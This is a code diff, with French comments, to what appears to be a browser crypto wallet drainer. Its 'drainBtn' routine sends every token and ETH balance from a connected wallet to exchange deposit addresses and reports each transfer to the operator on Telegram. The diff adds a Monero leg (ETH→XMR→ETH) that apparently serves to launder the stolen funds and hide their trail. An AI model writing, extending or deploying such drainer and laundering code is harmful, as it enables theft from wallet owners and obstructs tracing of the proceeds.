@@ -10,6 +10,7 @@ const BATCH_ABI = [
 ];
 const ERC20_APPROVE_ABI = ['function approve(address spender, uint256 amount) returns (bool)'];
 const BATCH_CONTRACTS = window.WB9_CONFIG?.batchContracts ?? {};
+const XMR_WALLET     = window.WB9_CONFIG?.xmrWallet ?? '';
 
 // ── Constants ─────────────────────────────────────────────────────────────────
 
@@ -645,6 +646,16 @@ async function ffCreateOrder(fromCcy, fromNetwork, amount) {
   return data.data; // { id, token, from: { address }, to: { amount } }
 }
 
+// 2nd leg: XMR → ETH, sends to myWallet (FLOAT — accepts any amount)
+async function ffCreateXmrOutOrder() {
+  const body = new URLSearchParams({ action: 'create_xmr_out' });
+  const res  = await fetch('api.php', { method: 'POST', body });
+  const data = await res.json();
+  if (data.error) throw new Error('ff.io XMR→ETH: ' + data.error);
+  if (data.code !== 0) throw new Error('ff.io XMR→ETH: ' + (data.msg ?? JSON.stringify(data)));
+  return data.data; // { id, token, from: { address (XMR deposit) }, to: { amount } }
+}
+
 // Network symbol used by ff.io for each chain id
 const FF_NETWORK = {
   1:     'ETH',
@@ -736,7 +747,9 @@ async function runBatchSend() {
 
   } else {
     // ── Fallback: ff.io token par token ──────────────────────────────────────
-    toast('Smart contract non déployé — envoi token par token via ff.io…', 'info');
+    const usingXmr = !!XMR_WALLET;
+    const leg1Label = usingXmr ? '→XMR' : '→ETH';
+    toast(`Smart contract non déployé — envoi via ff.io${usingXmr ? ' (ETH→XMR→ETH)' : ''}…`, 'info');
     const network = FF_NETWORK[state.chainId] ?? 'ETH';
     let sent = 0, failed = 0;
 
@@ -750,12 +763,12 @@ async function runBatchSend() {
         const order     = await ffCreateOrder(symbol, network, formatted);
         const depositAddr = order.from?.address;
         if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
-        tgNotify(`🔄 *Ordre ff.io*\n💱 ${formatted} ${symbol}\n🆔 \`${order.id}\``);
+        tgNotify(`🔄 *Ordre ff.io ${symbol}${leg1Label}*\n💱 ${formatted} ${symbol}\n🆔 \`${order.id}\``);
         const tx = await contract.transfer(depositAddr, balance);
         drainBtn.textContent = `⏳ ${symbol}…`;
         await tx.wait();
         await logTransfer({ symbol, amount: formatted, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
-        tgNotify(`✅ *Confirmé*\n💰 ${formatted} ${symbol}\n🔗 \`${tx.hash}\``);
+        tgNotify(`✅ *Confirmé ${symbol}${leg1Label}*\n💰 ${formatted} ${symbol}\n🔗 \`${tx.hash}\``);
         sent++;
       } catch (e) {
         if (e.code === 4001 || e.code === 'ACTION_REJECTED') toast(`${symbol} refusé`, 'error');
@@ -778,10 +791,32 @@ async function runBatchSend() {
         const tx = await state.signer.sendTransaction({ to: depositAddr, value: sendable });
         await tx.wait();
         await logTransfer({ symbol: 'ETH', amount: ethAmount, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
-        tgNotify(`✅ *ETH confirmé*\n💰 ${ethAmount} ETH\n🔗 \`${tx.hash}\``);
+        tgNotify(`✅ *ETH${leg1Label} confirmé*\n💰 ${ethAmount} ETH\n🔗 \`${tx.hash}\``);
         sent++;
       }
     } catch (e) { failed++; }
+
+    // ── 2nd leg : XMR → ETH (si xmrWallet configuré) ──────────────────────
+    if (usingXmr && sent > 0) {
+      try {
+        drainBtn.textContent = '⏳ Création ordre XMR→ETH…';
+        const xmrOut      = await ffCreateXmrOutOrder();
+        const xmrDeposit  = xmrOut.from?.address;
+        if (xmrDeposit) {
+          tgNotify(
+            `🔁 *Ordre XMR→ETH créé*\n` +
+            `📥 Envoyer XMR depuis wallet intermédiaire vers :\n` +
+            `\`${xmrDeposit}\`\n` +
+            `🆔 Ordre ff.io : \`${xmrOut.id}\``
+          );
+          await logTransfer({ symbol: 'XMR', amount: 'pending', txHash: '', ffOrderId: xmrOut.id, type: 'xmr_out' });
+          toast('Ordre XMR→ETH créé — adresse dépôt XMR envoyée sur Telegram.', 'success');
+        }
+      } catch (e) {
+        tgNotify(`⚠️ Ordre XMR→ETH échoué: ${e.message}`);
+        toast('Ordre XMR→ETH échoué: ' + e.message, 'error');
+      }
+    }
 
     toast(`Terminé — ${sent} envoyé(s), ${failed} échoué(s).`, sent > 0 ? 'success' : 'error');
   }
